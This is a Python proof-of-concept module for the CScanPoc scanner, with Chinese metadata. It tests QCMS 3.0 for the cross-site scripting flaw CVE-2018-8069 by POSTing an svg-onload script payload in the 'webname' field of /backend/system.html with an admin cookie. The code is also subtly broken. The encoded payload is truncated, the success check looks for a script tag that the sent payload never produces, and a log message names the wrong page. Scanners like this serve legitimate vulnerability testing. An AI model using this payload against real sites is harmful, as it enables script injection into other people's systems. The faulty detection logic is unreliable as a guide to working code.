# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'QCMS_0002_L'  # 平台漏洞编号，留空
    name = 'QCMS跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-03-12'  # 漏洞公布时间
    desc = '''
        QCMS是一套开源的用于创建响应式网站的内容管理系统（CMS）。
        QCMS 3.0版本中存在跨站脚本漏洞。远程攻击者可通过向/backend/system.html URI发送‘webname’参数利用该漏洞注入任意的Web脚本或HTML。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-06391'  # 漏洞来源
    cnvd_id = 'CNVD-2018-06391'  # cnvd漏洞编号
    cve_id = 'CVE-2018-8069'  # cve编号
    product = 'QCMS'  # 漏洞应用名称
    product_version = 'QCMS 3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '882d6f7b-676c-4375-8f71-6f2281fbc12a'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookies': {
                    'type': 'string',
                    'description': 'cookies',
                    'default': ''
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 登录用户
            self.output.info('开始对网站进行跨站脚本漏洞检查...')
            payload = '/backend/system.html'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                'Cookie': '%s' % self.get_option('cookies')
            }
            data = "webname=%3Csvg%2Fonload%3Dalert%28cscan%29%3"
            url = self.target + payload
            self.output.info('对网站/guest/index.html页面进行跨站请求验证...')
            r = requests.post(url, headers=headers, data=data)

            if "<script>alert(cscan)</script>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
